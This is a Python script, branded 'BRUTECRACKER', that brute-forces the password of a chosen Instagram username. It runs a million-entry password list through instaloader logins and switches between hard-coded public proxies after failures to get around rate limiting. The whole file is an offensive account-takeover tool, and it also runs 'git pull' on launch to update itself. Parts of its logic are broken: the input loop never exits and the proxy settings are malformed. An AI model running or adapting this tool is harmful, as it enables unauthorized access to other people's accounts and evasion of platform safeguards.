import requests
import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
import re
from rich.console import Console
from rich.panel import Panel
from rich import print
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Minimal intro module
def start():
    print("Intro module loaded, starting...")
os.system("git pull")
class bcolors:
    # color codes
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[95m'
    WARNING = '\033[93m'
    MAGENTA = '\033[95m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'


start()
codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
            "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
L = instaloader.Instaloader()
veri_break = "no"

while True:
    if veri_break == "si":
        break
    USER = ""
    USER = input('\033[90m[\033[91m?\033[90m]] \033[92m ENTER INSTAGRAM USERNAME FOR CRACK PASSWORD \n  ' '└─> ')
    wl = input("\n[?]Enter the PassList along The Path " '\n └─> ')
sleepp = 0

file1 = open("10-million-password-list-top-1000000.txt", 'r')
Lines = file1.readlines()
count = 0
os.system("clear")

print(Panel( '''

       _==/          i     i          \==_
     /XX/            |\___/|            \XX\
   /XXXX\            |XXXXX|            /XXXX\
  |XXXXXX\_         _XXXXXXX_         _/XXXXXX|
 XXXXXXXXXXXxxxxxxxXXXXXXXXXXXxxxxxxxXXXXXXXXXXX
|XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
|XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|
 XXXXXX/^^^^"\XXXXXXXXXXXXXXXXXXXXX/^^^^^\XXXXXX
  |XXX|       \XXX/^^\XXXXX/^^\XXX/       |XXX|
    \XX\       \X/    \XXX/    \X/       /XX/
       "\       "      \X/      "      /"

[bold red]RESPECT BRUTECRACKER by soloXrespect'                     
'''))
print(Panel('''
[bold white][[bold red]^[bold white]] [bold green] instagram: @soloXrespect
 '''))

# Add proxy configuration
http_proxy = "http://10.10.1.10:3128"
https_proxy = "https://10.10.1.11:1080"
ftp_proxy = "ftp://10.10.1.10:3128"
proxyDict = {
    "http": "120.236.74.213:9002, 188.123.114.167:80, 185.82.139.1:443, 1.10.231.42:8080",
    "https": "158.69.53.98:9300, 193.201.228.121:80, 31.186.239.245:8080, 112.217.162.5:3128",
    "ftp": "36.91.166.98:8080, 188.132.222.3:8080, 188.132.221.24:8080, 185.230.48.164:32650"
}

# initialize counter and proxy switch flag
failed_attempts = 0
use_proxy = False
proxy_list = ["120.236.74.213:9002", "188.123.114.167:80", "185.82.139.1:443"]
proxy_index = 0

for line in Lines:
    try:
        PASSWORD = ""
        count += 1
        pstest = ("{}".format(line.strip()))
        PASSWORD = pstest
        choiceCode = random.choice(codeList)
        time.sleep(5) # add a delay of 5 seconds before each login attempt)
        print("\n[bold red] Trying "+pstest+"...")
        if use_proxy:
            # use proxy if flag is set
            session = requests.Session()
            session.proxies = {"http": proxy_list[proxy_index]}
            L.context._session = session
        L.login(USER, PASSWORD)
        print("\n[bold green] [94m[✓] Password found: "+pstest)
        veri_break = "si"
        break
    except instaloader.exceptions.BadCredentialsException:
        print("[bold red][!] Incorrect password: "+pstest)
        failed_attempts += 1
        if failed_attempts >= 9:
            # switch to using a different proxy after 9 failed attempts
            use_proxy = True
            failed_attempts = 0 # reset counter after switching to new proxy
            proxy_index = (proxy_index + 1) % len(proxy_list) # cycle through proxies in the list
            print("\n[!] Switching to new proxy server: " + proxy_list[proxy_index])
    except instaloader.exceptions.ConnectionException:
        print(bcolors.FAIL +
              "\n[bold red][!] Incorrect Password/Network Error\n Use Stable Connection! ")
    except instaloader.exceptions.InvalidArgumentException:
        print(bcolors.FAIL+"\n[bold red][☹] Username not found")

file1.close()
L.close()
print("\n[bold green]Completed..!!")
print("[bold green] Thank you for  Buying Insta!!\n")
print("[bold yellow] If You Dont Get Password/ Try Another Password List")
exit()